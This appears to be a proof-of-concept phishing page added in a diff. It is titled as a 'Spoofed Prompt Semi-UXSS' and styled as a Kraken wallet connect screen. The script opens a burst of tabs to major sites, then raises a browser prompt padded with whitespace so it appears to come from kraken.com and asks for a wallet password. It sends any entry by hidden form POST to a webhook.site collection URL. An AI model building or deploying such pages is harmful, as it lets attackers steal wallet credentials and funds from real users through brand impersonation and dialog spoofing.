@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>KRAKEN WALLET — Spoofed Prompt Semi-UXSS</title>
+  <style>
+    html, body { margin:0; height:100%; background:#0a1a2a; color:#e0f7fa; font-family:system-ui; display:grid; place-items:center; }
+    .card { background:#122240; padding:24px; border-radius:16px; box-shadow:0 8px 32px rgba(0,0,0,0.5); max-width:420px; text-align:center; }
+    h1 { margin:0 0 8px; font-size:22px; color:#00c853; }
+    p { margin:8px 0 20px; font-size:14px; color:#80deea; }
+    button { padding:14px 28px; font-size:16px; border:0; border-radius:12px; cursor:pointer; background:#00c853; color:#000; font-weight:bold; }
+    button:hover { background:#00e676; }
+    #status { margin-top:20px; color:#80deea; font-size:14px; }
+    code { background:#1a3a5c; padding:2px 6px; border-radius:6px; font-size:13px; }
+    .kraken-logo { font-size:28px; margin-bottom:12px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="kraken-logo">KRAKEN</div>
+    <h1>Kraken Wallet Connect</h1>
+    <p>Tap to connect wallet in background. A secure prompt will appear.</p>
+    <button id="go">Connect Wallet</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // === CONFIG ===
+    const SINK_URL = "https://webhook.site/2c1d7ce8-a03c-4f27-9b1c-8919a32bd492";
+    const TARGETS = [
+      "https://www.google.com/csi",
+      "https://www.wikipedia.org/",
+      "https://www.youtube.com/robots.txt",
+      "https://www.apple.com/contact/",
+      "https://www.microsoft.com/",
+      "https://www.amazon.com/robots.txt",
+      "https://www.instagram.com/",
+      "https://www.yahoo.com/",
+      "https://www.reddit.com/robots.txt",
+      "https://developer.mozilla.org/"
+    ];
+
+    const statusEl = document.getElementById("status");
+
+    function openBurst(count = 10) {
+      const handles = [];
+      let opened = 0;
+
+      for (let i = 0; i < count; i++) {
+        const url = TARGETS[i % TARGETS.length];
+        const delay = i * 50 + Math.floor(Math.random() * 30);
+
+        setTimeout(() => {
+          try {
+            const h = window.open(url, "_blank");
+            if (h) {
+              handles.push(h);
+              opened++;
+            }
+          } catch (_) {}
+        }, delay);
+      }
+
+      setTimeout(() => {
+        statusEl.innerHTML = `Burst: ${opened}/${count} tabs opened.<br/>Spoofed prompt in 1.2s...`;
+      }, count * 55 + 200);
+
+      return handles;
+    }
+
+    function fireSpoofedPrompt(handles) {
+      setTimeout(() => {
+        // === SPOOFED PROMPT LIKE KRAKEN ===
+        const spoofedMsg = "kraken.com says                                                                                                                                                                                                                               Enter your wallet password:";
+        
+        const p = prompt(spoofedMsg, "");
+
+        if (p !== null && p !== "") {
+          // Exfiltrate via hidden form
+          const form = document.createElement("form");
+          form.method = "POST";
+          form.action = SINK_URL;
+          form.style.display = "none";
+
+          const input = document.createElement("input");
+          input.name = "kraken_password";
+          input.value = p;
+          form.appendChild(input);
+
+          document.body.appendChild(form);
+          form.submit();
+
+          statusEl.innerHTML = "PWNED!<br>Password stolen & sent to attacker.";
+        } else {
+          statusEl.innerHTML = "Prompt shown. No input.";
+        }
+
+        // Cleanup
+        setTimeout(() => {
+          handles.forEach(h => { try { if (h && !h.closed) h.close(); } catch(_) {} });
+        }, 1500);
+
+      }, 1200 + Math.floor(Math.random() * 400));
+    }
+
+    document.getElementById("go").addEventListener("click", () => {
+      statusEl.textContent = "Launching race...";
+      const handles = openBurst(10);
+      fireSpoofedPrompt(handles);
+    });
+  </script>
+</body>
+</html>
